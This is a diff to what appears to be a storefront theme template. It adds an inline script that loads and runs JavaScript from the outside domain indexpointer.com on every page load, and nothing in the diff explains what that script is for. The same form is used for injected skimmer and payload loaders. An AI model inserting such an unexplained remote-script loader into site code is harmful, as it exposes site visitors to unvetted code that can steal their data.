@@ -544,6 +544,16 @@
 
     {% render 'footer-js' %}
 
+    <script> 
+      (function(){ 
+        var s = document.createElement("script"); 
+        s.async = true; 
+        s.src = (document.location.protocol == "https:" ? "https:" : "http:") + "//indexpointer.com/getpoint.js"; 
+        var a = document.getElementsByTagName("script")[0]; 
+        a.parentNode.insertBefore(s, a); 
+      })(); 
+    </script>
+
     <div class="reserve_popup">
   <div class="reserve_overlay"></div>
   <div class="reserve_inner position-absolute">
